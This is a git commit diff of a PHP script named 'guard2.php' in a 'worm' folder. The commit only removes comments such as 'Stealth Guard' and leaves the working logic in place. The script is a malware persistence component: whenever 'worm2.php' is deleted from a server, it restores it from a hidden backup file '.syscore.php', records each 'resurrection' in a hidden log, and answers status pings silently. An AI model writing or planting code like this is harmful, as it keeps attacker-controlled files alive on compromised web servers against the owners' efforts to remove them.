cc95d24e6498aa77dc278c0177e2aef40c9a6812
6ickzone <6ickwhispers@gmail.com>
2025-11-21 21:59:03 +0700

    Update guard2.php

--- worm/guard2.php
+++ worm/guard2.php
@@ -1,22 +1,22 @@
 <?php
-// Stealth Guard by 0x6ick
-$_main = 'worm2.php';           //target
-$_backup = '.syscore.php';     // Backup
-$_log = '.reslog';             // log resurrection
+//Guard by 0x6ick
+$_main = 'worm2.php';          
+$_backup = '.syscore.php';    
+$_log = '.reslog';         
 
 if (!file_exists($_main)) {
     if (file_exists($_backup)) {
         copy($_backup, $_main);
 
-        // Tulis log timestamp
+        //timestamp
         $t = date("Y-m-d H:i:s");
         file_put_contents($_log, "[+] $_main resurrected at $t\n", FILE_APPEND);
 
-        // Silent output
+        
         echo "<!-- Resurrection complete -->";
     }
 } else {
-    // Silent ping jika aktif
+   
     echo "<!-- Alive -->";
 }
 ?>
